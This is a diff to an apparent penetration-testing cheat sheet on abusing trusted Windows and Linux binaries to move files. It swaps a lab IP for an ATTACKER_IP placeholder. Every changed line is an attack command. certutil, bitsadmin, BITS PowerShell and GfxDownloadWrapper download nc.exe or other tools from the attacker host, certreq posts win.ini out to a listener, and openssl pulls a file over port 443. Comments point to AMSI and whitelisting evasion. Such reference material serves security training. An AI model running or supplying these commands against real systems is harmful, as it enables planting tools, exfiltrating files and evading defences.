@@ -23,23 +23,23 @@ A "LOLBIN" is a trusted binary abused beyond its purpose: download, upload, exec
 
 ```cmd
 :: certutil (a defacto wget for Windows; AMSI flags this usage)
-certutil.exe -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe
+certutil.exe -urlcache -split -f http://ATTACKER_IP:8000/nc.exe nc.exe
 :: bitsadmin
-bitsadmin /transfer job /priority foreground http://10.10.14.5:8000/nc.exe C:\Temp\nc.exe
+bitsadmin /transfer job /priority foreground http://ATTACKER_IP:8000/nc.exe C:\Temp\nc.exe
 ```
 
 ```powershell
 # BITS via PowerShell
-Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.5:8000/nc.exe" -Destination "C:\Temp\nc.exe"
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://ATTACKER_IP:8000/nc.exe" -Destination "C:\Temp\nc.exe"
 # A misplaced-trust binary that application whitelisting may allow
-GfxDownloadWrapper.exe "http://10.10.14.5/tool.exe" "C:\Temp\tool.exe"
+GfxDownloadWrapper.exe "http://ATTACKER_IP/tool.exe" "C:\Temp\tool.exe"
 ```
 
 ## Windows upload
 
 ```cmd
 :: certreq posts a file to your listener (nc -lvnp 8000 to catch it)
-certreq.exe -Post -config http://10.10.14.5:8000/ c:\windows\win.ini
+certreq.exe -Post -config http://ATTACKER_IP:8000/ c:\windows\win.ini
 ```
 
 ## Linux (GTFOBins), openssl as an nc-style transfer
@@ -49,7 +49,7 @@ certreq.exe -Post -config http://10.10.14.5:8000/ c:\windows\win.ini
 openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
 openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < tool
 # On the target: receive it
-openssl s_client -connect 10.10.14.5:443 -quiet > tool
+openssl s_client -connect ATTACKER_IP:443 -quiet > tool
 ```
 
 ## Notes
